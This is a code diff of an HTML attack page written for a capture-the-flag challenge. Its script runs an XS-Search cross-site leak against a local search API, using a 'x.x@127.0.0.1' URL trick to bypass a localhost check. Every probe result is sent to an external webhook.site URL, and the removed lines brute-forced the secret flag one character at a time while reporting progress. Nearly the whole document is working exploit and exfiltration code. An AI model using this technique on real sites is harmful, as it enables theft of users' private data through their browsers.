@@ -2,49 +2,30 @@
 <html><head><title>abuse</title></head><body>
 <script>
 const W='https://webhook.site/97b90c33-9617-4d41-a1a2-d054deac91e4';
-// XS-Search via onload/onerror differential:
-//   match -> 200 -> JSON array [{...}] -> parseable as JS expression -> onload
-//   no match -> 404 -> JSON object {"message":"..."} -> "message":"..." at top-level is syntax error -> onerror
-// bot in challenge container -> use http://x.x@127.0.0.1:1337 to bypass isLocalhost
 const B='http://x.x@127.0.0.1:1337/api/entries/search?q=';
 
 function probe(q){
   return new Promise(resolve=>{
     const s=document.createElement('script');
     s.src=B+encodeURIComponent(q);
-    s.onload=()=>{ s.remove(); resolve(true); };
-    s.onerror=()=>{ s.remove(); resolve(false); };
+    s.onload=()=>{ fetch(W+'?q='+encodeURIComponent(q)+'&r=load'); s.remove(); resolve(true); };
+    s.onerror=()=>{ fetch(W+'?q='+encodeURIComponent(q)+'&r=err'); s.remove(); resolve(false); };
     document.head.appendChild(s);
-    setTimeout(()=>resolve(null),4000);
+    setTimeout(()=>resolve(null),5000);
   });
 }
 
-async function probeBatch(prefix, charset){
-  // 並行多個 probes
-  const results = await Promise.all(charset.split('').map(c => probe(prefix+c).then(r=>[c,r])));
-  for (const [c,r] of results){
-    if (r===true) return c;
-  }
-  return null;
-}
-
 (async()=>{
-  const charset='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-{}!@#$%^&*+=,.?/';
-  let flag='HTB{';
-  fetch(W+'?start=1&t='+Date.now());
-  for(let i=0;i<60;i++){
-    const found = await probeBatch(flag, charset);
-    if (found===null){
-      fetch(W+'?stuck=' + encodeURIComponent(flag));
-      return;
-    }
-    flag += found;
-    fetch(W+'?progress='+encodeURIComponent(flag));
-    if (found==='}') {
-      fetch(W+'?done='+encodeURIComponent(flag));
-      return;
-    }
-  }
+  fetch(W+'?start=1');
+  // 測試幾個 known matches and known non-matches
+  const r1 = await probe('Drunk');  // match approved
+  fetch(W+'?Drunk=' + r1);
+  const r2 = await probe('XXX_NOMATCH');  // no match
+  fetch(W+'?nomatch=' + r2);
+  const r3 = await probe('HTB');  // potential match unapproved
+  fetch(W+'?HTB=' + r3);
+  const r4 = await probe('HTB{');  // potential match unapproved
+  fetch(W+'?HTB_brace=' + r4);
 })();
 </script>
 </body></html>
